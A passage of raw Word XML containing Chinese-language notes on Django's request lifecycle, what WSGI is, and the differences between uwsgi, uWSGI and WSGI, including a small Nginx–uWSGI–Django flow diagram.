        <w:t>csrf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>request.session</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，如果验证不通过直接跳转到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08957699"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通过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>配置文件找到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>urls.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68F37923"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根据浏览器发送的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，通过视图中间件去匹配不同的视图函数或视图类，如果没有找到相对应的视图函数，就直接跳转到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5F7B1E56"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在视图函数或视图类中进行业务逻辑处理，处理完返回到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1147B54B"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模型类通过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>ORM</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>获取数据库数据，并返回序列化</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>或渲染好的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Template</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>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0702AEE1"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所有最后离开的响应都会到达</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>response</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>中间件，对响应的数据进行处理，返回</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>HttpResponse</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>给</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>wsgi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CFB9CCC" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6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wsgi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>经过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>uWSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>服务器</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>将响应的内容发送给浏览器。</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="2BBAF449" w14:textId="2CEF8359" w:rsidR="00024E97" w:rsidRPr="003A0200" w:rsidRDefault="00024E9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w:t>
      </w:r>
      <w:r w:rsidR="00AD41B7" w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>10</w:t>
      </w:r>
      <w:r w:rsidR="00AD41B7" w:rsidRPr="003A0200">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什么是</w:t>
      </w:r>
      <w:r w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>WSGI</w:t>
      </w:r>
      <w:r w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E3A5482" w14:textId="77777777" w:rsidR="00024E97" w:rsidRPr="00AD41B7" w:rsidRDefault="00024E97" w:rsidP="00AD41B7">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41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>WSGI(Python Web Server Gateway Interface</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，即</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>服务器网关接口</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>是</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Python</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>定义的</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>服服务器和</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>应用程序或框架之间的一种简单而通用的接口。它是</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Python</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>为了解决</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>服务器端与客户端之间的通信问题而产生的，它基于现存的</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>CGI</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>标准而设计。其定义了</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>服务器如何与</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Python</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>应用程序进行交互，让</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Python</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>写的</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>应用程序可以和</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>服务器对接起来。</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
      <w:r w:rsidRPr="00AD41B7">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EC8DDB6" w14:textId="34FE1CCF" w:rsidR="00024E97" w:rsidRPr="003A0200" w:rsidRDefault="00024E9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w:t>
      </w:r>
      <w:r w:rsidR="00AD41B7" w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>11</w:t>
      </w:r>
      <w:r w:rsidR="00AD41B7" w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>uwsgi</w:t>
      </w:r>
      <w:r w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>uWSGI</w:t>
      </w:r>
      <w:r w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>WSGI</w:t>
      </w:r>
      <w:r w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的区别</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AEE6AD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中级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uwsgi</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uWSGI</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WSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B04829F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="003D1617" w:rsidRDefault="00024E97"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3D1617">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>graph LR</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="356BC54B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="003D1617" w:rsidRDefault="00024E97"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3D1617">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Nginx-- uwsgi ---uWSGI</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07852D72" w14:textId="571400B3" w:rsidR="00024E97" w:rsidRPr="003D1617" w:rsidRDefault="00024E97"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3D1617">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>uWSGI-- WSGI ---Django</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B2D2D82" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="69"/>
        </w:numPr>
        <w:spacing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uwsgi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>：是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>uWSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>服务器实现的独有协议，用于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Nginx</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>服务与</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>uWSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>服务的通信规范</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F378575" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="69"/>
        </w:numPr>
        <w:spacing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uWSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>：是一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>服务器，它实现了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>WSGI/uwsgi/HTTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
